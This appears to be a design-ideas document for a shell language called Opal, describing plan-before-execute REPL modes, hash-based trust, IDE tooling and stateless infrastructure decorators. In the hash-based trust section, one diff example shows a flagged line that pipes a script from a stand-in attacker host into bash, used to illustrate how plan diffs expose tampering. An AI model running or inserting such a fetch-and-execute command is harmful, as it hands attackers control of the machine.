# Future Ideas

## Plan-First Execution Model

### Core Concept
See exactly what will run before running it.

### REPL Modes

**Execute mode (default):**
```bash
opal> deploy("staging")
✓ Executed successfully
```

**Plan mode (dry-run):**
```bash
opal> plan deploy("staging")
Plan: a3b2c1d4
  1. kubectl apply -f k8s/staging/
  2. kubectl scale --replicas=3 deployment/app
  
Execute? [y/N]
```

### Safe Remote Code

```bash
opal> import "https://example.com/deploy.opl"
opal> plan setup()

Plan: a3b2c1d4
  1. @shell("apt-get update")
  2. @shell("apt-get install -y docker.io")
  3. @file.write("/etc/docker/daemon.json", ...)
  
⚠️  This plan will:
  - Install packages: docker.io
  - Modify system file: /etc/docker/daemon.json
  
Execute? [y/N]
```

### Hash-Based Trust

Plans have deterministic hashes:
- Community can vouch for plan hashes
- Verify you're running the same plan others reviewed
- Differential analysis on updates

```bash
opal> import "https://example.com/script.opl" --update
⚠️  New version detected

opal> diff old-plan new-plan
+ Added: @shell("curl evil.com/backdoor.sh | bash")  # 🚨
```

## Interactive REPL

```bash
$ opal
opal> fun deploy(env: String) {
...     @shell("kubectl apply -f k8s/@var.env/")
...   }
Function 'deploy' defined

opal> deploy("staging")
✓ Executed successfully

opal> @env.USER
"adavies"
```

Features:
- Command history and completion
- Function definitions
- Decorator integration
- Plan mode built-in

## System Shell

Could Opal be a daily-driver shell?

**What's needed:**
- REPL infrastructure
- Built-in commands (cd, pwd, exit)
- Environment variables
- I/O redirection
- Job control

**Approach:** Start with REPL, see how it feels, then decide.

## LSP/IDE Integration

Real-time tooling:
- Syntax checking as you type
- Autocomplete
- Jump to definition
- Hover documentation
- Rename refactoring

## Plan Verification

**Audit trail:**
- Every plan has a hash
- Track what was planned vs executed
- Compliance reporting

**CI/CD workflow:**
```bash
# Generate plan for review
opal plan deploy("prod") > plan.txt

# Human reviews

# Execute exact plan
opal execute plan.txt
```

**Differential analysis:**
```bash
opal> diff plan-v1 plan-v2
  1. kubectl apply -f k8s/staging/
  1. kubectl apply -f k8s/prod/        # Different path
```

## Infrastructure as Code (IaC)

### Block Decorators with Context

Decorators that create resources and provide context to their blocks:

```bash
@aws.instance.deploy(type: "t3.medium", region: "us-east-1") {
  # Block executes inside the newly created instance
  @shell("apt-get update")
  @shell("apt-get install -y nginx")
  @file.write("/etc/nginx/nginx.conf", @var.config)
}
# Instance is created, commands run inside it, then block completes
```

```bash
@docker.container.run(image: "ubuntu:22.04") {
  # Commands run inside the container
  @shell("echo 'Hello from container'")
  @file.read("/etc/os-release")
}
# Container is cleaned up after block
```

```bash
@terraform.workspace("production") {
  # All terraform commands scoped to this workspace
  @terraform.apply("infrastructure/")
  @terraform.output("load_balancer_ip")
}
```

### Resource Lifecycle

Two modes for resource management:

**1. Ephemeral (default for @docker, @temp resources):**
```bash
@docker.container.run(image: "ubuntu:22.04") {
  @shell("echo 'Hello'")
}
# Container destroyed after block
```

**2. Idempotent (default for @aws, @terraform resources):**
```bash
@aws.instance.ensure(name: "web-server", type: "t3.medium") {
  @shell("systemctl restart nginx")
}
# First run: creates instance, runs block
# Second run: instance exists, skips creation, runs block
# Instance persists after block
```

**Explicit cleanup:**
```bash
@aws.instance.ensure(name: "temp-builder", type: "t3.large") {
  @shell("make build")
} cleanup: always
# Always destroys instance after block, even if it existed before
```

**Lifecycle options:**
- `cleanup: never` - Resource persists (default for IaC)
- `cleanup: always` - Resource destroyed after block (default for containers)
- `cleanup: on_create` - Only destroy if we created it (hybrid mode)

### Plan Shows Infrastructure Changes

**First run (creates resources):**
```bash
opal> plan deploy_infrastructure()

Plan: a3b2c1d4
  1. @aws.instance.ensure(name: "web-server", type: "t3.medium")
     └─ Will create: EC2 instance (doesn't exist)
     └─ Estimated cost: $0.05/hour
     └─ Block will execute inside instance:
        - apt-get update
        - apt-get install -y nginx
  2. @aws.security_group.attach(instance: "web-server", rules: [...])
     └─ Will create: Security group
     
⚠️  This plan will:
  - Create 1 EC2 instance ($0.05/hour)
  - Create 1 security group
  
Execute? [y/N]
```

**Second run (idempotent, skips creation):**
```bash
opal> plan deploy_infrastructure()

Plan: b5c6d7e8
  1. @aws.instance.ensure(name: "web-server", type: "t3.medium")
     └─ Exists: EC2 instance i-abc123 (running)
     └─ No changes needed
     └─ Block will execute inside instance:
        - apt-get update
        - apt-get install -y nginx
  2. @aws.security_group.attach(instance: "web-server", rules: [...])
     └─ Exists: Security group sg-xyz789
     └─ No changes needed
     
✓ No infrastructure changes
⚠️  Will run commands on existing instance
  
Execute? [y/N]
```

### Stateless Infrastructure Management

**Key difference from Terraform/Pulumi:**

Opal doesn't maintain state files. It re-evaluates infrastructure on every run:

```bash
# First run
opal> deploy_infrastructure()
✓ Created EC2 instance i-abc123
✓ Created security group sg-xyz789

# Second run (same command)
opal> deploy_infrastructure()
✓ Instance i-abc123 exists, no changes
✓ Security group sg-xyz789 exists, no changes

# Destroy infrastructure (use any tool)
$ aws ec2 terminate-instances --instance-ids i-abc123

# Third run (Opal doesn't break)
opal> deploy_infrastructure()
✓ Created EC2 instance i-def456  # New instance, no state conflict
```

**Benefits:**
- No state file to manage or corrupt
- No state locking issues
- Destroy infrastructure however you want (AWS console, CLI, other tools)
- Opal just checks "does this exist?" and acts accordingly
- Can't get out of sync with reality

**How it works:**
- Decorators query actual infrastructure state
- `@aws.instance.ensure()` checks if instance exists
- If exists: skip creation
- If missing: create it
- No local state to maintain

**Implications:**
- Mix Opal with other tools freely (Terraform, AWS CLI, console)
- No "state drift" - Opal always sees current reality
- Team members can destroy/modify resources without coordinating state
- Simpler mental model: "run the script, it does the right thing"
- No state file backup/recovery needed

### Why This Works

- Plan-first model shows infrastructure changes before applying
- Block decorators provide clean resource scoping
- Stateless design prevents state file issues
- Re-evaluation on every run stays in sync with reality
- Decorator contracts enforce safety

## Why These Ideas Work

Opal's architecture enables them:
- Event-based parsing (fast, analyzable)
- Plan-then-execute model (verifiable, safe)
- Decorator system (extensible, sandboxable)
- Sub-millisecond performance (instant feedback)

Not all will be implemented, but they show what's possible.
